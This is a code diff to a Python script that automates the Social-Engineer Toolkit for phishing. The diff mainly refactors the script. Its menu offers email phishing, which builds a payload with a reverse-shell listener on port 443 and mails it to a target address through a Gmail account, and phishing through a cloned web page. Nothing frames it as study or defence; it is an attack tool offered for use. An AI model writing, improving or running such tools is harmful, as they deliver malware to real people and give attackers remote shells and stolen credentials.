@@ -2,10 +2,10 @@ import subprocess
 
 def run_setoolkit(commands):
     process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    for command in commands:
-        process.stdin.write(command)
-    process.stdin.close()
-    process.wait()
+    output, errors = process.communicate(input="".join(commands))
+    print(output)
+    if errors:
+        print(errors)
 
 def email_phishing():
     ip = input("Your IP to listen to the shell: ")
@@ -25,7 +25,7 @@ def email_phishing():
         "443\n",  # Port
         "2\n",  # Create a Payload and Listener
         f"{filename}\n",  # Payload name
-        "1\n",  # Use built-in email attack
+        "1\n",  # Use a built-in email attack
         "1\n",  # Single Email Address
         "3\n",  # GMail
         f"{targetmail}\n",  # Target email
@@ -35,7 +35,7 @@ def email_phishing():
         f"{password}\n",  # Email password
         "yes\n",  # Send email
         "yes\n",  # Are you sure?
-        "yes\n"  # Do you want to send another email?
+        "no\n"   # Do you want to send another email?
     ]
     
     run_setoolkit(commands)
@@ -52,13 +52,18 @@ def clone_page():
 
     run_setoolkit(commands)
 
-option = input("Do you want to phish using 1. email, 2. phone nr., or 3. clone page?: ")
+def main():
+    option = input("Do you want to phish using 1. email, 2. phone nr., or 3. clone page?: ")
 
-if option == "1":
-    email_phishing()
-elif option == "2":
-    print("Phone number phishing is not implemented.")
-elif option == "3":
-    clone_page()
-else:
-    print("Invalid option.")
+    if option == "1":
+        email_phishing()
+    elif option == "2":
+        print("Phone number phishing is not implemented.")
+    elif option == "3":
+        clone_page()
+    else:
+        print("Invalid option.")
+
+if __name__ == "__main__":
+    main()
+
